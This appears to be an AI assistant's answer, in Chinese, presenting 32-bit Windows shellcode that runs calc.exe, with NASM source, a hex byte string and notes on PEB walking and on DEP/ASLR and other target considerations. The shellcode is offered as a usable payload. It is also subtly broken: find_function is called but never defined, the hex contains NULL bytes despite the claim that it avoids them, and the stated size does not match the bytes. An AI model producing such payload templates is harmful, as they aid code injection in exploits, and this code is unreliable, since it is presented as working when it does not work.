这里是一个 Windows x86 (32位) 执行 calc.exe 的 shellcode，并附详细解析：

```nasm
; Windows x86 shellcode - 执行 calc.exe
; 大小: 68 bytes

global _start
section .text
_start:
    ; 清零寄存器
    xor ecx, ecx            ; ECX = 0
    mul ecx                 ; EAX, EDX = 0
    
    ; 构建栈空间
    push ecx                ; 字符串结束符NULL
    push 0x6578652e        ; 压入"exe."
    push 0x636c6163        ; 压入"calc"
    mov ebx, esp           ; EBX指向"calc.exe"字符串
    
    ; 获取kernel32.dll基址
    mov edx, [fs:0x30]     ; 获取PEB
    mov edx, [edx + 0x0C]  ; 获取PEB->Ldr
    mov edx, [edx + 0x14]  ; 获取第一个模块
    mov edx, [edx]         ; 获取第二个模块
    mov edx, [edx]         ; 获取第三个模块
    mov edx, [edx + 0x10]  ; 获取kernel32.dll基址
    
    ; 准备WinExec参数
    push 5                  ; uCmdShow = SW_SHOW (5)
    push ebx               ; lpCmdLine = "calc.exe"
    
    ; 查找WinExec地址
    mov eax, 0xEC0E4E8E    ; WinExec函数散列
    mov ebx, edx           ; 内核基址作为参数
    call find_function     ; 查找函数地址
    
    ; 调用WinExec
    call eax              ; WinExec("calc.exe", 5)
    
    ; 退出
    ret
```

十六进制形式：
```
\x31\xc9\xf7\xe1\x51\x68\x2e\x65\x78\x65\x68\x63\x61\x6c\x63\x89\xe3\x64\x8b\x15\x30\x00\x00\x00\x8b\x52\x0c\x8b\x52\x14\x8b\x02\x8b\x02\x8b\x52\x10\x6a\x05\x53\xb8\x8e\x4e\x0e\xec\x89\xd3\xe8\x0b\x00\x00\x00\xff\xd0\xc3
```

主要区别和解析：

1. 寄存器使用的区别：
- 使用32位寄存器(eax, ebx等)
- 不再使用r8-r11等64位专用寄存器

2. 堆栈操作：
- 32位下压栈为4字节操作
- 字符串构建方式略有不同

3. PEB访问：
- 使用fs段寄存器访问PEB(32位)
- 偏移值和结构体布局不同

4. 系统调用方式：
- 使用stdcall调用约定
- 参数通过栈传递

5. 关键结构：
```
PEB访问:
fs:[0x30]              ; PEB位置(32位)
[edx + 0x0C]          ; PEB_LDR_DATA
[edx + 0x14]          ; InMemoryOrderModuleList

参数传递:
push 5                ; 第二个参数(uCmdShow)
push ebx              ; 第一个参数(lpCmdLine)
```

6. 内存布局考虑：
- 32位地址空间(4GB)
- 堆栈对齐要求不同
- 指针大小为4字节

注意事项：
1. 代码更紧凑，因为32位指令一般较短
2. 需注意栈平衡
3. 同样避免使用NULL字节
4. 考虑DEP/ASLR等保护机制

这个32位shellcode相比64位版本：
- 代码更简单直观
- 使用更传统的Windows调用约定
- 内存寻址更简单
- 整体尺寸更小

实际应用时需要注意：
1. 目标系统的兼容性
2. 可能的漏洞缓解措施
3. 字符限制要求
4. 执行环境的特殊性